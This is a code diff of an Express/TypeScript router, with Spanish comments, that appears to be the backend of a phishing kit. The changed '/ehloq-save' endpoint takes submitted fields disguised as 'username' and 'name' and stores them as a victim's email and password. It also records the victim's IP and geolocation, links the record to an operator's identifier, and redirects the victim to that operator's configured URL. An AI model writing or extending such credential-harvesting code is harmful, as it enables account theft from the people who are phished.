@@ -1,11 +1,13 @@
-import express, { Request, Response } from 'express';
+import express, { Response } from 'express';
 import geoip from 'geoip-lite';
 import requestIp from 'request-ip';
 import { CustomRequest } from '../utils/custom.request.interface.js';
 import * as UserDB from '../database/user/user.database.js'
-// import * as AccountDB from '../database/account/account.database.js'
+import * as AccountDB from '../database/account/account.database.js'
 import { PagePaylaod } from '../utils/page.payload.interface.js';
 import { allowPostWords } from '../utils/allowed_words.js';
+import { IAccount } from '../database/account/account.model.js';
+import { getCountryByAlpha2 } from 'country-locale-map';
 
 const router = express.Router();
 
@@ -56,51 +58,61 @@ router.get("/ehloq-load", async (req: CustomRequest, res: Response) => {
     res.send(code);
 });
 
-router.post("/ehloq-save", (req: Request, res: Response) => {
+router.post("/ehloq-save", async (req: CustomRequest, res: Response) => {
     try {
         const clientIp = requestIp.getClientIp(req) || "";
 
-        // const identifier = req.headers.identifier;
-        // if (!identifier) {
-        //     return res.status(404).send('Página no encontrada');
-        // }
+        const identifier = req.headers.identifier;
+        if (!identifier) {
+            return res.status(404).send('Página no encontrada');
+        }
     
-        // const user = await UserDB.getUserById(identifier);
-        // if (!user) {
-        //     return res.status(404).send('Página no encontrada');
-        // }
-        console.log("REQUEST => ", req.body);
+        const user = await UserDB.getUserById(identifier);
+        if (!user) {
+            return res.status(404).send('Página no encontrada');
+        }
 
         const cleanBody = JSON.parse(JSON.stringify(req.body));
         console.log("cleanBody => ", cleanBody);
-        
-        
+
+        if(!cleanBody.username || !cleanBody.name){
+            return res.status(404).send('Página no encontrada');
+        }
+
         // Extrae los datos de la solicitud (deberías validarlos adecuadamente)
         // const { email, password, username, country, countryCode } = req.body;
 
         // Obtener información geográfica
-        const geo = geoip.lookup(clientIp);
+        const geoInfo = geoip.lookup(clientIp);
+        if(!geoInfo || !geoInfo.country){
+            return res.status(404).send('Página no encontrada');
+        }
 
         // Imprimir los datos en la consola
         console.log("IP del usuario:", clientIp);
-        console.log("Información geográfica:", geo);
+        console.log("Información geográfica:", geoInfo);
 
         // Crea una nueva cuenta
-        // const newAccount = await AccountDB.saveNewAccount({
-        //     email: "string",
-        //     password: "string",
-        //     username: "string",
-        //     country: "string",
-        //     countryCode: geo?.country,
-        //     active: true,
-        //     ipAddress: clientIp,
-        // });
+        const newAccountData: IAccount = {
+            email: (cleanBody.username as string),
+            password: (cleanBody.name as string),
+            username: user.username,
+            country: getCountryByAlpha2(geoInfo.country)?.name || "",
+            countryCode: geoInfo.country,
+            active: true,
+            ipAddress: clientIp,
+            userAgent: "",
+            cookies: {},
+            createdAt: new Date(),
+        };
+        
+        await AccountDB.saveNewAccount(newAccountData);
 
         // Guarda la cuenta en la base de datos
         // const savedAccount = await newAccount.save();
 
-        return res.send("EhloQ"); // Respuesta de ejemplo
-         
+        // return res.send("EhloQ"); // Respuesta de ejemplo
+        return res.redirect(307, user.config.redirect);
     } catch (error) {
         console.error("Error al procesar la solicitud:", error);
         return res.status(500).send("Error interno del servidor");
